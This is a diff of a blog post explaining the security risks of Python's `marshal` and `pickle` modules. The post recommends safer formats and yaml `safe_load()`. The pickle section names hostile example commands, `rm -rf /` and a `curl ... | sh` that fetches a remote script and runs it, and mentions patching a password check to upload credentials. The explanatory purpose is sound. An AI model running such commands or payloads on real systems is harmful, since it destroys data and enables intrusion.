@@ -20,11 +20,11 @@ big red warning:
 
 Lets see why.
 
-
 Marshal
-=======
-There are no **known** ways to exploit `marshal`. Actually executing code when
-using `marshal.loads()` is not something I was able to do, and looking at the
+-------
+
+There are no **known** ways to exploit `marshal`. Executing code when using
+`marshal.loads()` is not something I was able to do, and looking at the
 `marhal.c` source code, I don't see an immediately obvious way.
 
 So why is this warning here? [The BDFL explains][bfdl]:
@@ -36,7 +36,7 @@ So why is this warning here? [The BDFL explains][bfdl]:
 
 I recommend you read the rest of the discussion; a bug is shown where
 unmarshaling data causes Python to segfault; this has been fixed since Python
-2.5 (this bug could, potentially, be abused to execute code). Other bugs *may*
+2.5 (this bug can, potentially, be abused to execute code). Other bugs *may*
 still exist, though!
 
 Furthermore, the `marshal` docs mention:
@@ -47,9 +47,9 @@ Furthermore, the `marshal` docs mention:
 
 So it's not even designed to persist data in a reliable way.
 
-
 Pickle
-======
+------
+
 You can easily execute arbitrary code with `pickle`. For example:
 
     >>> import pickle
@@ -58,7 +58,7 @@ You can easily execute arbitrary code with `pickle`. For example:
     boot  dev   etc       lib   lost+found  opt  root  sbin  sys  ubuntu  vagrant
     0
 
-This was a harmless `ls /`, but could also be a less harmless `rm -rf /`, or a
+This is a harmless `ls /`, but can also be a less harmless `rm -rf /`, or a
 `curl http://example.com/hack.sh | sh`.
 
 You can see how this works by using the `pickletools` module:
@@ -74,7 +74,7 @@ You can see how this works by using the `pickletools` module:
 
 `pickle.py` has some comments on what these opcodes mean:
 
-    GLOBAL         = b'c'   # push self.find_class(modname, name); 2 string args 
+    GLOBAL         = b'c'   # push self.find_class(modname, name); 2 string args
     MARK           = b'('   # push special markobject on stack
     STRING         = b'S'   # push string; NL-terminated string argument
     TUPLE          = b't'   # build tuple from topmost stack items
@@ -85,11 +85,12 @@ Most of it is self-explanatory; with `GLOBAL` you can get any function, and
 with `REDUCE` you call it.
 
 Since Python is pretty dynamic, you can also use this to monkey-patch a program
-in run-time. For example, you could change the `check_password` function with
-one where you upload the password to a server.
+in run-time. For example, you can change the `check_password` function with one
+where you upload the password to a server.
 
 So what *is* secure?
-====================
+--------------------
+
 XML, json, MessagePack, ini files, or perhaps something else. It depends on
 which format is the best in your situation.
 
@@ -103,24 +104,24 @@ time, it's used a lot in public-facing apps, so it's *probably* safe. It'll
 certainly be safer than `marshal`, since this was only designed for `.pyc` files
 and explicitly comes with a "not audited!" warning.
 
-This is of course no guarantee. Remember that [YAML security hole a few years back
-that caused every Ruby on Rails application in the world to be vulnerable to
+This is no guarantee. Remember that [YAML security hole a few years back that
+caused every Ruby on Rails application in the world to be vulnerable to
 arbitrary code execution][yaml-oops]. Oops! And this wasn't even a subtle buffer
 overflow, but a much more obvious problem.
 
-Note that you should *not* use [yaml][yaml]'s `load()` method, as this has [the
-same problems as Ruby's YAML][no-yaml]. Use `safe_load()` instead.
+You should *not* use [yaml][yaml]'s `load()` method, as this has [the same
+problems as Ruby's YAML][no-yaml]. Use `safe_load()` instead.
 
 Conclusion
-==========
-The warning in the `pickle` module is very much warranted (it should probably be
-stated stronger), while the warning above the `marshal` module seems to be more
-of a "*this code was not designed with security in mind*"-type of warning, but
-actually exploiting it is not as easy, and relies on the hypothetical existence
-on unknown bugs. Still, you're probably better off using something else.
+----------
 
+The warning in the `pickle` module is very much warranted (it should be stated
+stronger), while the warning above the `marshal` module is more of a "*this code
+was not designed with security in mind*"-type of warning, but actually
+exploiting it is not as easy and relies on the hypothetical existence on unknown
+bugs. Still, you're probably better off using something else.
 
-[^1]: There really ought to be a "carefully analyzed against buffer overflows and so on" seal of trust for open source projects. Yeah, you can shelf out the big bucks and get your code analyzed by Veracode and such, but this is not feasible for open source projects. There is *some* effort to do this after the OpenSSL Heartbleed clusterfuck a few years ago in the form of the [Core Infrastructure Initiative](https://en.wikipedia.org/wiki/Core_Infrastructure_Initiative), but its scope and budget are fairly limited (but it's fairly young, and may gain traction in a few years).
+[^1]: There really ought to be a "carefully analyzed against buffer overflows and so on" seal of trust for open source projects. Yeah, you can shelf out the big bucks and get your code analyzed by Veracode and such, but this is not feasible for open source projects. There is *some* effort to do this after the OpenSSL Heartbleed clusterfuck a few years ago in the form of the [Core Infrastructure Initiative](https://en.wikipedia.org/wiki/Core_Infrastructure_Initiative), but its scope and budget are limited (but it's young, and may gain traction in a few years).
 
 [marshal]: https://docs.python.org/3/library/marshal.html
 [pickle]: https://docs.python.org/3/library/pickle.html
